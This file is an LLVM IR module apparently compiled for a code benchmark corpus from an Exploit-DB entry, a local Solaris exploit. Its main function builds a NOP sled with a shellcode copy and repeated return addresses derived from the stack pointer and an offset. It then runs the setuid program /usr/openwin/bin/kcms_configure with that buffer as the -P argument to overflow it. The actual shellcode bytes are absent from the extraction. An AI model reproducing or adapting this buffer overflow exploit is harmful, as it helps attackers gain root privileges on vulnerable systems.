; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19341.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19341.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@offset = common dso_local global i32 0, align 4
@nop = common dso_local global i32 0, align 4
@esp = common dso_local global i32 0, align 4
@buf = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFLEN = common dso_local global i32 0, align 4
@shell = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [47 x i8] c"jumping to 0x%08x (0x%08x offset %d) [nop %d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"/usr/openwin/bin/kcms_configure\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"kcms_configure\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-P\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"foofoo\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"exec failed!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = icmp sgt i32 %6, 1
  br i1 %7, label %8, label %13

8:                                                ; preds = %2
  %9 = load i8**, i8*** %4, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @strtol(i8* %11, i32* null, i32 0)
  store i32 %12, i32* @offset, align 4
  br label %13

13:                                               ; preds = %8, %2
  %14 = load i32, i32* %3, align 4
  %15 = icmp sgt i32 %14, 2
  br i1 %15, label %16, label %21

16:                                               ; preds = %13
  %17 = load i8**, i8*** %4, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 2
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @strtoul(i8* %19, i32* null, i32 0)
  store i32 %20, i32* @nop, align 4
  br label %22

21:                                               ; preds = %13
  store i32 285, i32* @nop, align 4
  br label %22

22:                                               ; preds = %21, %16
  %23 = call i32 (...) @get_esp()
  store i32 %23, i32* @esp, align 4
  %24 = load i32*, i32** @buf, align 8
  %25 = load i32, i32* @NOP, align 4
  %26 = load i32, i32* @BUFLEN, align 4
  %27 = call i32 @memset(i32* %24, i32 %25, i32 %26)
  %28 = load i32*, i32** @buf, align 8
  %29 = load i32, i32* @nop, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* @shell, align 4
  %33 = load i32, i32* @shell, align 4
  %34 = call i32 @strlen(i32 %33)
  %35 = call i32 @memcpy(i32* %31, i32 %32, i32 %34)
  %36 = load i32, i32* @nop, align 4
  %37 = load i32, i32* @shell, align 4
  %38 = call i32 @strlen(i32 %37)
  %39 = add nsw i32 %36, %38
  store i32 %39, i32* %5, align 4
  br label %40

40:                                               ; preds = %53, %22
  %41 = load i32, i32* %5, align 4
  %42 = load i32, i32* @BUFLEN, align 4
  %43 = sub nsw i32 %42, 4
  %44 = icmp slt i32 %41, %43
  br i1 %44, label %45, label %56

45:                                               ; preds = %40
  %46 = load i32, i32* @esp, align 4
  %47 = load i32, i32* @offset, align 4
  %48 = add nsw i32 %46, %47
  %49 = load i32*, i32** @buf, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 %48, i32* %52, align 4
  br label %53

53:                                               ; preds = %45
  %54 = load i32, i32* %5, align 4
  %55 = add nsw i32 %54, 4
  store i32 %55, i32* %5, align 4
  br label %40

56:                                               ; preds = %40
  %57 = load i32, i32* @esp, align 4
  %58 = load i32, i32* @offset, align 4
  %59 = add nsw i32 %57, %58
  %60 = load i32, i32* @esp, align 4
  %61 = load i32, i32* @offset, align 4
  %62 = load i32, i32* @nop, align 4
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0), i32 %59, i32 %60, i32 %61, i32 %62)
  %64 = load i32*, i32** @buf, align 8
  %65 = call i32 @execl(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %64, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i32* null)
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  ret void
}

declare dso_local i32 @strtol(i8*, i32*, i32) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
